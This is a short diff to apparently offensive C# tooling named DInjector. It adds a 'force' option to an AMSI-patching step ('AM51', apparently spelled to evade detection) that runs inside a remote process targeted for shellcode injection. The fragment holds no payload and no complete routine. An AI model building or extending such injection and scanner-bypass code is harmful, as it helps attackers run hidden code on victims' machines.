@@ -8,7 +8,7 @@ namespace DInjector
 {
     class RemoteThreadView
     {
-        public static void Execute(byte[] shellcode, int processID, bool remoteAm51)
+        public static void Execute(byte[] shellcode, int processID, bool remoteAm51, bool forceAm51)
         {
             #region NtOpenProcess
 
@@ -27,7 +27,11 @@ namespace DInjector
             else
                 throw new Exception($"(RemoteThreadView) [-] NtOpenProcess: {ntstatus}");
 
-            if (remoteAm51) AM51.Patch(rhProcess, processID);
+            if (remoteAm51)
+                AM51.Patch(
+                    processHandle: rhProcess,
+                    processID: processID,
+                    force: forceAm51);
 
             #endregion
 
